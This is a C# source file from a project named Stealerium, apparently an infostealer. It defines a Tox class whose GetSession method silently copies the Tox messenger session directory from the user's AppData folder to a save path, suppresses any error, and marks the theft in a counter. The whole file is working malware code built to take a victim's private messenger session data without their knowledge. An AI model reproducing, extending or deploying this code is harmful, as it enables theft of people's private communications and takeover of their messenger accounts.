using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Messengers
{
    internal sealed class Tox
    {
        private static readonly string ToxPath = Path.Combine(Paths.Appdata, "Tox");

        // Copy session directory
        public static void GetSession(string sSavePath)
        {
            if (!Directory.Exists(ToxPath))
                return;
            try
            {
                Filemanager.CopyDirectory(ToxPath, sSavePath);
            }
            catch
            {
                //
            }

            Counter.Tox = true;
        }
    }
}